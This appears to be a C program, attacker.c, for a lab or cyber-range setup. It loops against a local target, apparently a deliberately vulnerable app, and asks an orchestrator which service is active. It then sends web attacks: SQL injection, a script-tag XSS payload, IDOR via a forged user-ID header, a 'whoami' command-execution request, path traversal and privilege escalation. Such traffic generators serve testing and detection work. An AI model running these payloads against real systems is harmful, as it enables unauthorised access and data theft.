#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

int main(void) {
    const char *target = getenv("MY_TARGET");
    if (!target) target = "http://localhost:9100";

    srand((unsigned int)time(NULL));
    printf("[attacker.c] started\n");

    while (1) {
        const char *s = "web";
        char servicebuf[64];
        FILE *p = popen("curl -s ${ORCH:-${ORCHESTRATOR_URL:-http://orchestrator:9000}}/current", "r");
        if (p) {
            char buf[1024];
            size_t n = fread(buf, 1, sizeof(buf)-1, p);
            buf[n] = '\0';
            pclose(p);
            if (strstr(buf, "\"active_service\":\"api\"")) s = "api";
            else if (strstr(buf, "\"active_service\":\"file\"")) s = "file";
            else if (strstr(buf, "\"active_service\":\"db\"")) s = "db";
        }
        char cmd[1024];
        if (strcmp(s, "web") == 0) {
            snprintf(cmd, sizeof(cmd),
                "curl -s -X POST %s/web/login -H 'Content-Type: application/json' -d '{\"username\":\"admin'' OR ''1''=''1\",\"password\":\"x\"}' >/dev/null; curl -s '%s/web/search?q=%%27%%20OR%%20%%271%%27%%3D%%271' >/dev/null; curl -s -X POST %s/web/comment -H 'Content-Type: application/json' -d '{\"comment\":\"<script>alert(1)</script>\"}' >/dev/null",
                target, target, target);
        } else if (strcmp(s, "api") == 0) {
            snprintf(cmd, sizeof(cmd),
                "curl -s %s/api/admin >/dev/null; curl -s %s/api/users/2 -H 'X-User-Id: 1' >/dev/null; curl -s -X POST %s/api/run -H 'Content-Type: application/json' -d '{\"cmd\":\"whoami\"}' >/dev/null",
                target, target, target);
        } else if (strcmp(s, "file") == 0) {
            snprintf(cmd, sizeof(cmd),
                "curl -s '%s/file/download?file=../files/sample.txt' >/dev/null",
                target);
        } else {
            snprintf(cmd, sizeof(cmd),
                "curl -s -X POST %s/db/query -H 'Content-Type: application/json' -d '{\"search\":\"'' OR ''1''=''1\"}' >/dev/null; curl -s -X POST %s/db/user/2/promote -H 'Content-Type: application/json' -d '{\"requester_id\":1}' >/dev/null",
                target, target);
        }
        int rc = system(cmd);
        printf("attack %s -> rc=%d\n", s, rc);
        sleep(3);
    }

    return 0;
}
